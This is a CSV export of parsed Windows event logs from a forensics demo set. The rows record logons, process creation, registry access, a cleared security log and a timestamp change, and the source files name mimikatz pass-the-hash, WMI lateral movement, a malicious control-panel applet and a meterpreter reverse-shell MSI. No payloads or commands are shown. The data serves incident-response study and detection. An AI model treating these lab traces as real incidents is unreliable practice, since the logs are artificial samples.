AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
109,452919,2019-03-19 23:35:15.3654773,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
110,452920,2019-03-19 23:35:15.3654773,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
111,452921,2019-03-19 23:35:15.3654773,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
112,452922,2019-03-19 23:35:15.3654773,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
1,1,2019-07-18 21:50:20.0494017,17,Info,Microsoft-Windows-Program-Compatibility-Assistant,Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant,5020,7468,MSEDGEWIN10,0,S-1-5-18,Path of executed program,,,,,,,,,C:\Users\IEUser\Desktop\procexp64.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_via_cpl_Application_Experience_EventID_17_ControlPanelApplet.evtx,0x4000000000000000,0,"{""UserData"":{""ResolverFiredEvent"":{""ExePath"":""C:\\Users\\IEUser\\Desktop\\procexp64.exe"",""ResolverName"":""WrpKeyMitigation""}}}"
2,2,2019-07-29 21:11:17.2821889,17,Info,Microsoft-Windows-Program-Compatibility-Assistant,Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant,4396,3944,MSEDGEWIN10,0,S-1-5-18,Path of executed program,,,,,,,,,C:\Users\IEUser\Downloads\Invoice@0582.cpl,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_via_cpl_Application_Experience_EventID_17_ControlPanelApplet.evtx,0x4000000000000000,0,"{""UserData"":{""ResolverFiredEvent"":{""ExePath"":""C:\\Users\\IEUser\\Downloads\\Invoice@0582.cpl"",""ResolverName"":""ControlPanelApplet""}}}"
3,3,2019-07-29 21:14:29.6387462,17,Info,Microsoft-Windows-Program-Compatibility-Assistant,Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant,4396,3976,MSEDGEWIN10,0,S-1-5-18,Path of executed program,,,,,,,,,C:\Users\IEUser\Desktop\procexp64.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_via_cpl_Application_Experience_EventID_17_ControlPanelApplet.evtx,0x4000000000000000,0,"{""UserData"":{""ResolverFiredEvent"":{""ExePath"":""C:\\Users\\IEUser\\Desktop\\procexp64.exe"",""ResolverName"":""WrpKeyMitigation""}}}"
4,4,2019-08-23 11:17:00.4833767,17,Info,Microsoft-Windows-Program-Compatibility-Assistant,Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant,1404,1644,MSEDGEWIN10,0,S-1-5-18,Path of executed program,,,,,,,,,C:\Users\IEUser\Desktop\procexp64.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_via_cpl_Application_Experience_EventID_17_ControlPanelApplet.evtx,0x4000000000000000,0,"{""UserData"":{""ResolverFiredEvent"":{""ExePath"":""C:\\Users\\IEUser\\Desktop\\procexp64.exe"",""ResolverName"":""WrpKeyMitigation""}}}"
1,563265,2019-03-18 22:15:36.0363760,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,696,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (fe80::79bf:8ee2:433c:2567)",Target: EXAMPLE\WIN-77LTAPHIQ1R$,LogonType 3,LogonId: 0x10FAC2,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""WIN-77LTAPHIQ1R$""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x10FAC2""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""5fdb15ee-2283-f23c-e23b-5e5ddb11bb9c""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::79bf:8ee2:433c:2567""},{""@Name"":""IpPort"",""#text"":""55585""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""}]}}"
2,563285,2019-03-18 22:15:49.5831024,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,3564,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (10.0.2.17)",Target: EXAMPLE\Administrator,LogonType 3,LogonId: 0x10FBCC,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-500""},{""@Name"":""TargetUserName"",""#text"":""Administrator""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x10FBCC""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""baec19da-130d-80f0-bd26-78045ee64d62""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""10.0.2.17""},{""@Name"":""IpPort"",""#text"":""49244""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
3,563294,2019-03-18 22:15:49.6142938,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,3564,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (10.0.2.17)",Target: EXAMPLE\Administrator,LogonType 3,LogonId: 0x10FBEB,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-500""},{""@Name"":""TargetUserName"",""#text"":""Administrator""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x10FBEB""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""baec19da-130d-80f0-bd26-78045ee64d62""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""10.0.2.17""},{""@Name"":""IpPort"",""#text"":""49249""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
4,563297,2019-03-18 22:15:49.6142938,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,3564,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-,PC01 (10.0.2.17),Target: EXAMPLE\Administrator,LogonType 3,LogonId: 0x10FC09,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-500""},{""@Name"":""TargetUserName"",""#text"":""Administrator""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x10FC09""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""NtLmSsp ""},{""@Name"":""AuthenticationPackageName"",""#text"":""NTLM""},{""@Name"":""WorkstationName"",""#text"":""PC01""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""NTLM V2""},{""@Name"":""KeyLength"",""#text"":""128""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""10.0.2.17""},{""@Name"":""IpPort"",""#text"":""49249""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
5,563298,2019-03-18 22:15:49.6458894,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,3696,WIN-77LTAPHIQ1R.example.corp,0,,A new process has been created,EXAMPLE\WIN-77LTAPHIQ1R$,,"Parent process: ",PID: 0xAE8,Parent PID: 0x248,"Mandatory label: ",Target User: \,,"C:\Windows\System32\wbem\WmiPrvSE.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WIN-77LTAPHIQ1R$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0xAE8""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\wbem\\WmiPrvSE.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x248""},{""@Name"":""CommandLine""}]}}"
6,563299,2019-03-18 22:15:49.6767481,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,3696,WIN-77LTAPHIQ1R.example.corp,0,,A new process has been created,EXAMPLE\WIN-77LTAPHIQ1R$,,"Parent process: ",PID: 0x424,Parent PID: 0xAE8,"Mandatory label: ",Target User: \,,"C:\Windows\System32\calc.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-20""},{""@Name"":""SubjectUserName"",""#text"":""WIN-77LTAPHIQ1R$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E4""},{""@Name"":""NewProcessId"",""#text"":""0x424""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\calc.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0xAE8""},{""@Name"":""CommandLine""}]}}"
7,563300,2019-03-18 22:15:49.6924018,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,2836,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (10.0.2.17)",Target: EXAMPLE\user01,LogonType 3,LogonId: 0x110085,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-1106""},{""@Name"":""TargetUserName"",""#text"":""user01""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x110085""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""31e347dc-ff67-08b3-eadc-1ec267b1975b""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""10.0.2.17""},{""@Name"":""IpPort"",""#text"":""49249""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
8,563342,2019-03-18 22:16:19.9899444,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,696,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (::1)",Target: EXAMPLE\WIN-77LTAPHIQ1R$,LogonType 3,LogonId: 0x116C7B,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""WIN-77LTAPHIQ1R$""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x116C7B""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""5fdb15ee-2283-f23c-e23b-5e5ddb11bb9c""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""55589""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
1,432901,2019-03-18 11:06:25.4852144,1102,Info,Microsoft-Windows-Eventlog,Security,856,2200,PC01.example.corp,0,,Event log cleared,EXAMPLE\user01,,SID: (S-1-5-21-1587066498-1489273250-1035260531-1106),,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-1587066498-1489273250-1035260531-1106"",""SubjectUserName"":""user01"",""SubjectDomainName"":""EXAMPLE"",""SubjectLogonId"":""0x18A7875""}}}"
2,432903,2019-03-18 11:06:29.9115792,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,524,2884,PC01.example.corp,0,,Successful logon,EXAMPLE\user01," (::1)",Target: EXAMPLE\user01,LogonType 9,LogonId: 0x4530F0F,AuthenticationPackageName: Negotiate,LogonProcessName: seclogo,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-1106""},{""@Name"":""SubjectUserName"",""#text"":""user01""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x18A7875""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-1106""},{""@Name"":""TargetUserName"",""#text"":""user01""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x4530F0F""},{""@Name"":""LogonType"",""#text"":""9""},{""@Name"":""LogonProcessName"",""#text"":""seclogo""},{""@Name"":""AuthenticationPackageName"",""#text"":""Negotiate""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x3EC""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""}]}}"
3,432904,2019-03-18 11:06:29.9115792,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,524,2884,PC01.example.corp,0,,Administrative logon,EXAMPLE\user01 (S-1-5-21-1587066498-1489273250-1035260531-1106),,"PrivilegeList: SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege",LogonId: 0x4530F0F,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-1106""},{""@Name"":""SubjectUserName"",""#text"":""user01""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x4530F0F""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege""}]}}"
4,432905,2019-03-18 11:06:29.9115792,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,48,PC01.example.corp,0,,A new process has been created,EXAMPLE\PC01$,,"Parent process: ",PID: 0x440,Parent PID: 0x448,"Mandatory label: ",Target User: \,,"C:\Windows\System32\cmd.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""PC01$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x440""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x448""},{""@Name"":""CommandLine""}]}}"
5,432906,2019-03-18 11:06:29.9616512,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,48,PC01.example.corp,0,,A new process has been created,EXAMPLE\PC01$,,"Parent process: ",PID: 0x370,Parent PID: 0x764,"Mandatory label: ",Target User: \,,"C:\Windows\System32\conhost.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""PC01$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x370""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\conhost.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x764""},{""@Name"":""CommandLine""}]}}"
6,433078,2019-03-18 11:06:46.3051520,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,48,PC01.example.corp,0,,A new process has been created,EXAMPLE\PC01$,,"Parent process: ",PID: 0xF6C,Parent PID: 0x278,"Mandatory label: ",Target User: \,,"C:\Windows\System32\dllhost.exe ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""PC01$""},{""@Name"":""SubjectDomainName"",""#text"":""EXAMPLE""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0xF6C""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\dllhost.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x278""},{""@Name"":""CommandLine""}]}}"
1,10147,2019-04-30 22:48:58.9014760,2,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1936,1644,IEWIN7,0,S-1-5-18,A process changed a file creation time,,,"ProcessID: 868, ProcessGUID: 365abb72-d0da-5cc8-0000-00109b5a3c00","RuleName: ",Image: C:\Windows\System32\msiexec.exe,TargetFilename: C:\Users\IEUser\AppData\Local\Temp\302a23.msi,CreationTimeUTC: 2019-04-30 22:43:38.892,PreviousCreationTimeUTC: 2019-04-30 22:48:58.901,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-04-30 22:48:58.901""},{""@Name"":""ProcessGuid"",""#text"":""365abb72-d0da-5cc8-0000-00109b5a3c00""},{""@Name"":""ProcessId"",""#text"":""868""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\msiexec.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\IEUser\\AppData\\Local\\Temp\\302a23.msi""},{""@Name"":""CreationUtcTime"",""#text"":""2019-04-30 22:43:38.892""},{""@Name"":""PreviousCreationUtcTime"",""#text"":""2019-04-30 22:48:58.901""}]}}"
